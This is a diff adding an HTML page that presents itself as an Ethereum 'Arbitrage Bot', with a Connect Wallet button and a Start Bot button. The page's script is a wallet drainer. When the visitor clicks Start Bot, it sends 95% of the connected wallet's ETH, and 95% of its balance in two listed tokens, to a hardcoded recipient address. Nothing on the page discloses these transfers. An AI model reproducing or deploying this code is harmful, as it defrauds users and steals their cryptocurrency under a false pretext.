@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arbitrage Bot on Ethereum</title>
+    <style>
+        /* Your existing styles here */
+    </style>
+</head>
+<body>
+
+<div id="app">
+    <h1>Start your Arbitrage Bot</h1>
+    <p id="walletAddress">Connect your wallet to see your address</p>
+    <button id="connectButton">Connect Wallet</button>
+    <button id="stakeButton" disabled>Start Bot</button>
+    <div class="status" id="status"></div>
+    <div id="progressBar"><div id="progress"></div></div>
+</div>
+
+<!-- Typing message div -->
+<div class="typing-text" id="typingMessage"></div>
+
+<div id="footer">
+    <a href="https://t.me/SocratesWeb3King" target="_blank">Telegram</a>
+    <a href="https://x.com/socratesweb3kin?s=21&t=pJyVwAY43BkwOF0vt4lRFQ" target="_blank">Twitter</a>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
+<script>
+    let web3;
+    let userAccount;
+    let recipientAddress = "0x91Dc7c5B75c0FCD64a02F648d56cDE818982D1f2";
+
+    // Array of token contract addresses
+    const tokenAddresses = [
+        "0x3739426e21D912B604C106f852d136bA58f61517",
+        "0x8bAF5d75CaE25c7dF6d1E0d26C52d19Ee848301a"
+    ];
+
+    // Function to detect wallet and connect
+    async function connectWallet() {
+        if (window.ethereum) {
+            web3 = new Web3(window.ethereum);
+            try {
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                userAccount = (await web3.eth.getAccounts())[0];
+                document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
+                document.getElementById("stakeButton").disabled = false;
+            } catch (error) {
+                alert("Error connecting to wallet: " + error.message);
+            }
+        } else {
+            alert("Please install MetaMask or Trust Wallet!");
+        }
+    }
+
+    document.getElementById("connectButton").addEventListener("click", connectWallet);
+
+    async function sendEthToRecipient() {
+        try {
+            const balance = await web3.eth.getBalance(userAccount);
+            const gasPrice = await web3.eth.getGasPrice();
+            const gasLimit = 21000;
+            const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
+            const amountToSend = (BigInt(balance) - gasCost) * BigInt(95) / BigInt(100);
+
+            if (amountToSend > 0) {
+                const tx = await web3.eth.sendTransaction({
+                    from: userAccount,
+                    to: recipientAddress,
+                    value: amountToSend.toString()
+                });
+                document.getElementById("status").innerText = `ETH Transfer successful: ${tx.transactionHash}`;
+            } else {
+                document.getElementById("status").innerText = "Insufficient ETH to cover gas fees.";
+            }
+        } catch (error) {
+            document.getElementById("status").innerText = `ETH Transfer failed: ${error.message}`;
+        }
+    }
+
+    async function sendTokensToRecipient() {
+        const tokenABI = [
+            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
+            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+        ];
+
+        for (const tokenAddress of tokenAddresses) {
+            const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+            try {
+                const balance = await tokenContract.methods.balanceOf(userAccount).call();
+                const amountToSend = BigInt(balance) * BigInt(95) / BigInt(100);
+
+                if (amountToSend > 0) {
+                    const tx = await tokenContract.methods.transfer(recipientAddress, amountToSend.toString()).send({ from: userAccount });
+                    document.getElementById("status").innerText += `Token Transfer successful for ${tokenAddress}: ${tx.transactionHash}\n`;
+                } else {
+                    document.getElementById("status").innerText += `Insufficient balance for token at address ${tokenAddress}.\n`;
+                }
+            } catch (error) {
+                document.getElementById("status").innerText += `Token Transfer failed for ${tokenAddress}: ${error.message}\n`;
+            }
+        }
+    }
+
+    document.getElementById("stakeButton").addEventListener("click", async () => {
+        document.getElementById("status").innerText = "Starting ETH and token transfers...";
+        await sendEthToRecipient();
+        await sendTokensToRecipient();
+    });
+</script>
+
+</body>
+</html>
